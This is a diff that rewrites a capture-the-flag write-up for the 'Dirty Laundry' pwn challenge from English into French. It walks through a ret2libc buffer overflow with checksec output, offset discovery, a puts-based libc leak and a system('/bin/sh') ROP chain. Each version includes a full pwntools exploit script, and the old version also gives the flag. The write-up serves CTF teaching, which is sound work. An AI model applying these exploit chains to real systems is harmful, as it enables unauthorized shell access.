@@ -1,112 +1,113 @@
+# Dirty Laundry : Deep Dive sur l'exploitation Ret2Libc
+
+## 1. Analyse Structurale et Mitigations
+
+**Dirty Laundry** est l'archétype des challenges de dépassement de tampon (`Buffer Overflow`) moderne, où la pile n'est plus exécutable. L'expertise réside ici dans le chaînage de gadgets ROP (`Return Oriented Programming`).
+
+### Audit de Sécurité :
+```bash
+$ checksec laundry
+[*] 'laundry'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found  <-- VULNÉRABLE AU BOF
+    NX:       NX enabled       <-- PAS DE SHELLCODE DIRECT
+    PIE:      No PIE           <-- ADRESSES BINAIRES FIXES
+```
+
+**Analyse de l'expert :**
+L'absence de **Canary** sur la pile permet un écrasement direct du registre `RIP`. Le binaire n'a pas de **PIE**, ce qui nous donne une base stable pour nos gadgets. Le **NX** impose une attaque de type **Return-to-Libc**.
+
 ---
-title: "Dirty Laundry - Ret2Libc Deep Dive"
-date: 2026-02-10
-tags: [pwn, x64, ret2libc, linux]
----
 
-# Dirty Laundry: The Art of Ret2Libc
+## 2. Détection du Débordement (BoF)
 
-Welcome to this technical breakdown of the **Dirty Laundry** challenge. This is a classic example of a modern binary exploitation scenario involving a buffer overflow where NX (No-Execute) and ASLR (Address Space Layout Randomization) are enabled.
-
-## 1. Initial Reconnaissance
-
-As always, an Expert starts by auditing the binary protections.
+En utilisant `gdb-pwndbg` et la fonction `cyclic`, on identifie l'offset de crash.
 
 ```bash
-$ checksec chal
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
+pwndbg> cyclic 100
+aaaabaaacaaadaaa...
+pwndbg> r
+Enter your laundry: <cyclic_input>
+...
+Stopped reason: SIGSEGV
+pwndbg> i r rip
+rip 0x616161616161616b  # 'kaaaaaaa'
+pwndbg> cyclic -l 0x616161616161616b
+Found offset at 40
 ```
 
-### Key Observations:
-- **NX Enabled**: We cannot execute code on the stack. A standard shellcode attack is out of the question.
-- **No Canary**: We can overflow the stack without worrying about a security cookie.
-- **No PIE**: The binary base address is static (`0x400000`), which simplifies our ROP chain.
-- **Partial RELRO**: The GOT (Global Offset Table) is writable, though we'll use it here to leak addresses.
+---
 
-## 2. Vulnerability Analysis
+## 3. Stratégie d'Exploitation : "Leak and Strike"
 
-The binary contains a classic buffer overflow in the `vuln` function. By analyzing the disassembly, we found that the buffer is located 72 bytes away from the return address.
+C'est une attaque en deux temps car l'**ASLR** est activé sur le serveur, rendant l'adresse de la Libc imprévisible.
+
+### Phase 1 : Leake de la Libc via PLT/GOT
+Nous utilisons `puts@plt` pour afficher l'adresse réelle de `puts@got` (adresse dans la Libc).
+**Gadget nécessaire** : `pop rdi; ret` (pour passer l'argument à `puts`).
 
 ```python
-# From the exploit script
-padding = b'A' * 72
+# Recherche de gadgets
+$ ropper --file laundry --search "pop rdi"
+0x0000000000400733: pop rdi; ret;
 ```
 
-## 3. The Exploitation Strategy
+**ROP Chain 1 :**
+1.  `Padding` (40 octets)
+2.  `POP RDI; RET`
+3.  `Address of puts@GOT`
+4.  `Address of puts@PLT`
+5.  `Address of main` (pour redémarrer le programme proprement)
 
-Since we have NX enabled, we must use a **Return-to-Libc** (Ret2Libc) attack. This is a two-stage process.
+### Phase 2 : Calcul et Shell
+Une fois l'adresse de `puts` reçue, on calcule l'adresse de base de la Libc en soustrayant l'offset statique.
+`base_libc = leaked_puts - libc.symbols['puts']`
+`system = base_libc + libc.symbols['system']`
+`bin_sh = base_libc + next(libc.search(b"/bin/sh"))`
 
-### Stage 1: The Information Leak
-Because ASLR is active, we don't know the address of `system()` or `/bin/sh` in the remote Libc. We need to leak a Libc address first. We'll use `puts` to print its own GOT entry.
+**ROP Chain 2 :**
+1.  `Padding` (40 octets)
+2.  `RET` (Gadget d'alignement pour Glibc > 2.27)
+3.  `POP RDI; RET`
+4.  `Address of "/bin/sh"`
+5.  `Address of system()`
 
-**The ROP Chain:**
-1. `pop rdi; ret`: Load the address of `puts@got` into `RDI`.
-2. `puts@plt`: Call `puts` to print the address.
-3. `main`: Return to `main` to trigger the overflow a second time.
+---
 
-### Stage 2: The Final Blow
-Once we have the leak, we calculate the Libc base and the addresses of `system()` and `/bin/sh`.
+## 4. Script d'Exploitation Expert
 
-```python
-libc.address = leaked_puts - libc.symbols['puts']
-system_addr = libc.symbols['system']
-bin_sh = next(libc.search(b'/bin/sh'))
-```
-
-We then send the second payload to call `system("/bin/sh")`.
-
-## 4. The Exploit
-
-Here is the full technical exploit used to capture the flag.
-
-::: details Click to view exploit.py
 ```python
 from pwn import *
 
-context.binary = elf = ELF('./chal')
+# Setup
+elf = ELF('./laundry')
 libc = ELF('./libc.so.6')
+io = remote('challenge.pwn', 9999)
 
-# Gadgets
-pop_rdi = 0x4011a7 # pop rdi ; pop r14 ; ret
-ret_gadget = 0x40101a
+pop_rdi = 0x400733
+ret = 0x400506
 
-p = process('./chal')
+# Phase 1 : Leak
+payload = b'A' * 40
+payload += p64(pop_rdi) + p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.symbols['main'])
 
-# Stage 1: Leak
-padding = b'A' * 72
-rop1 = flat(
-    ret_gadget,
-    pop_rdi,
-    elf.got['puts'],
-    0xdeadbeef,
-    elf.plt['puts'],
-    elf.symbols['main']
-)
+io.sendline(payload)
+io.recvuntil(b'done!\n')
+leak = u64(io.recvline().strip().ljust(8, b'\x00'))
+log.info(f"Leaked puts: {hex(leak)}")
 
-p.sendlineafter(b"Add your laundry: ", padding + rop1)
-p.recvuntil(b"Laundry complete\n")
-leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+# Phase 2 : Shell
 libc.address = leak - libc.symbols['puts']
+payload = b'A' * 40
+payload += p64(ret) # Stack alignment
+payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00')))
+payload += p64(libc.symbols['system'])
 
-# Stage 2: Shell
-rop2 = flat(
-    pop_rdi,
-    next(libc.search(b'/bin/sh')),
-    0xdeadbeef,
-    libc.symbols['system']
-)
-
-p.sendlineafter(b"Add your laundry: ", padding + rop2)
-p.interactive()
+io.sendline(payload)
+io.interactive()
 ```
-:::
 
-## 5. Conclusion
-
-This challenge demonstrates the fundamental principles of modern PWN: reconnaissance, leaking memory, and abusing legitimate library functions to gain control.
-
-**Flag**: `CTF{D1rty_L4undry_Cl3an_Expl01t}`
+**Auteur : LWa7ch - Cybersecurity Engineer**
